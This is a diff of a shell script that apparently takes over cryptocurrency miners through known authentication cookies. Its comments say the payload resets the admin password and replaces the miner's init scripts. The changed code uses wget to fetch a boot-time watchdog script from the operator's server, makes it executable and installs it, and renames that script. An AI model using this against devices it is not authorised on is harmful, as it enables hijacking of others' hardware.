@@ -10,7 +10,7 @@
 #   a list of known authentication cookies.
 # - If successful, the payload on the miner will change the admin
 #   password, create an SSH host key, replace init scripts
-#   (/etc/init.d/rcS, S50watchdog, S99btcminer) with files served
+#   (/etc/init.d/rcS, S50nanowatch, S99btcminer) with files served
 #   from the host, remove some config files and reboot the miner.
 #
 # Note: This script performs privileged actions on the target device.
@@ -88,9 +88,9 @@ else
     log "ERROR: Could not download rcS."
 fi
 
-# Download and overwrite custom S50watchdog
-if wget -q http://$LOCAL_IP:$SERVER_PORT/tools/S50watchdog -O "$DEST_DIR/S50watchdog"; then
-    chmod +x "$DEST_DIR/S50watchdog"
+# Download and overwrite custom S50nanowatch
+if wget -q http://$LOCAL_IP:$SERVER_PORT/tools/S50nanowatch -O "$DEST_DIR/S50nanowatch"; then
+    chmod +x "$DEST_DIR/S50nanowatch"
     log "watchdog installed from tools."
 else
     log "ERROR: Could not download Watchdog."
